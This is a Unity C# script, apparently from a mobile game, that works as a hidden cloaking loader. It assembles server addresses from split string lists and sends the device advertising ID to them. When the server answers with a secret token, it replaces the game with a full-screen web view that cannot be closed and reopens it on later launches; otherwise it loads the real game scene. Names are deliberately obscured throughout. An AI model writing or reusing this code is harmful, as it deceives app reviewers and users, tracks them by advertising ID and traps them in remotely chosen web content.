using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using System;
using System.Collections;
using System.Collections.Generic;

public class MainWOL : MonoBehaviour
{
    public List<string> splitters;
    public List<string> splitters1;
    public List<string> splitters2;
    [HideInInspector] public string oWOLname = "";
    [HideInInspector] public string tWOLname = "";
    [HideInInspector] public string tWOLname1 = "";
    [HideInInspector] public string tWOLname2 = "";

    private Dictionary<string, object> exubWOLs;
    private bool? _isexWOL;
    private string _exWOL;

    private bool WOLLo = false;

    private IEnumerator WOLSECGE(string liWOL)
    {
        using (UnityWebRequest request = UnityWebRequest.Get(liWOL))
        {
            yield return request.SendWebRequest();

            try
            {
                if (request.result == UnityWebRequest.Result.Success)
                {
                    _exWOL = request.downloadHandler.text.Replace("\"", "");

                    PlayerPrefs.SetString("Link", _exWOL);
                }

                else if (request.result == UnityWebRequest.Result.ProtocolError || request.result == UnityWebRequest.Result.ConnectionError)
                {
                    throw new Exception("Error");
                }

                exubWOLs = CONVERTWOLPROCESS(new Uri(_exWOL).Query);

                if (exubWOLs == new Dictionary<string, object>())
                {
                    _isexWOL = false;

                    STARTIENUMENATORWOL(_isexWOL.Value);
                }

                else
                {
                    _isexWOL = true;

                    STARTIENUMENATORWOL(_isexWOL.Value);
                }
            }

            catch (Exception e)
            {
                Debug.Log(e.ToString());

                STARTIENUMENATORWOL(false);
            }
        }
    }         

    private void FirstTimeWOLOpen()
    {
        if (PlayerPrefs.GetInt("FirstTimeOpening?", 1) == 1)
        {
            PlayerPrefs.SetInt("FirstTimeOpening", 0);

            string fullInstallWOLEventEndpoint = tWOLname2 + string.Format("?advertiser_tracking_id={0}", oWOLname);

            StartCoroutine(WOLSECGE(fullInstallWOLEventEndpoint));
        }
    }

    private IEnumerator CANTWOLOP(int tioc)
    {
        yield return new WaitForSeconds(tioc);

        if (WOLLo)
            yield break;

        else
            STARTIENUMENATORWOL(false);

        yield break;
    }

    private Dictionary<string, object> CONVERTWOLPROCESS(string WOLqueue)
    {
        Dictionary<string, object> result = new Dictionary<string, object>();

        try
        {
            string processedWOLqueue = WOLqueue.Remove(0, 1);
            string[] pairs = processedWOLqueue.Split('&');

            foreach (string pair in pairs)
            {
                string[] splittedWOLqueuPair = pair.Split("=");

                result.Add(splittedWOLqueuPair[0], splittedWOLqueuPair[1]);
            }
        }

        catch
        {
            return new Dictionary<string, object>();
        }

        return result;
    }

   

    private void STARTIENUMENATORWOL(bool isexWOL) => StartCoroutine(IENUMENATORWOL(isexWOL));

    private void MESHWOLLOOK(string AdresWOLquote, string NamingWOL = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);

        var _ropesWOL = gameObject.AddComponent<UniWebView>();
        _ropesWOL.SetToolbarDoneButtonText("");

        switch (NamingWOL)
        {
            case "0":
                _ropesWOL.SetShowToolbar(true, false, false, true);
                break;

            default:
                _ropesWOL.SetShowToolbar(false);
                break;
        }

        _ropesWOL.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);

        _ropesWOL.OnShouldClose += (view) =>
        {
            return false;
        };

        _ropesWOL.SetSupportMultipleWindows(true);
        _ropesWOL.SetAllowBackForwardNavigationGestures(true);

        _ropesWOL.OnMultipleWindowOpened += (view, windowId) =>
        {
            _ropesWOL.SetShowToolbar(true);

        };

        _ropesWOL.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingWOL)
            {
                case "0":
                    _ropesWOL.SetShowToolbar(true, false, false, true);
                    break;

                default:
                    _ropesWOL.SetShowToolbar(false);
                    break;
            }
        };

        _ropesWOL.OnOrientationChanged += (view, orientation) =>
        {
            _ropesWOL.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };

        _ropesWOL.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("AdresWOLquote", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("AdresWOLquote", url);
            }
        };

        _ropesWOL.Load(AdresWOLquote);
        _ropesWOL.Show();
    }

    private void OpeningWOL()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Boot");
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            StartCoroutine(CANTWOLOP(10));

            foreach (string n in splitters)
                tWOLname += n;

            foreach (string n in splitters1)
                tWOLname1 += n;

            foreach (string n in splitters2)
                tWOLname2 += n;

            StartCoroutine(WOLSECGE(tWOLname1 + string.Format("?advertiser_tracking_id={0}", oWOLname)));

            FirstTimeWOLOpen();
        }

        else
            OpeningWOL();
    }

    private void Awake()
    {
        PlayerPrefs.SetString("AdresWOLquote", string.Empty);

        if (PlayerPrefs.GetInt("idfaWOL") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oWOLname = advertisingId; });
        }
    }



    private IEnumerator IENUMENATORWOL(bool isexWOL)
    {
        using (UnityWebRequest wol = UnityWebRequest.Get(tWOLname))
        {
            yield return wol.SendWebRequest();

            if (wol.result == UnityWebRequest.Result.ProtocolError || wol.result == UnityWebRequest.Result.ConnectionError)
                OpeningWOL();

            if (!isexWOL && PlayerPrefs.GetString("AdresWOLquote", string.Empty) != string.Empty)
            {
                MESHWOLLOOK(PlayerPrefs.GetString("AdresWOLquote"));

                WOLLo = true;

                yield break;
            }

            int systemWOL = 7;

            while (PlayerPrefs.GetString("glrobo", "") == "" && systemWOL > 0)
            {
                yield return new WaitForSeconds(1);
                systemWOL--;
            }

            try
            {
                if (wol.result == UnityWebRequest.Result.Success)
                {
                    if (wol.downloadHandler.text.Contains("WngsffLmtsBwfdxs"))
                    {
                        switch (isexWOL)
                        {
                            case true:
                                string WOLfin = wol.downloadHandler.text.Replace("\"", "");

                                WOLfin += "/?";

                                try
                                {
                                    foreach (KeyValuePair<string, object> entry in exubWOLs)
                                    {
                                        WOLfin += entry.Key + "=" + entry.Value + "&";
                                    }

                                    WOLfin = WOLfin.Remove(WOLfin.Length - 1);

                                    MESHWOLLOOK(WOLfin);

                                    WOLLo = true;
                                }

                                catch
                                {
                                    goto case false;
                                }

                                break;

                            case false:
                                try
                                {
                                    var subscs = wol.downloadHandler.text.Split('|');
                                    WOLfin = subscs[0] + "?idfa=" + oWOLname;

                                    PlayerPrefs.SetString("AdresWOLquote", WOLfin);

                                    MESHWOLLOOK(WOLfin, subscs[1]);

                                    WOLLo = true;
                                }

                                catch
                                {
                                    WOLfin = wol.downloadHandler.text + "?idfa=" + oWOLname;

                                    PlayerPrefs.SetString("AdresWOLquote", WOLfin);

                                    MESHWOLLOOK(WOLfin);

                                    WOLLo = true;
                                }

                                break;
                        }
                    }

                    else
                        OpeningWOL();
                }

                else
                    OpeningWOL();
            }

            catch
            {
                OpeningWOL();
            }
        }
    }


}


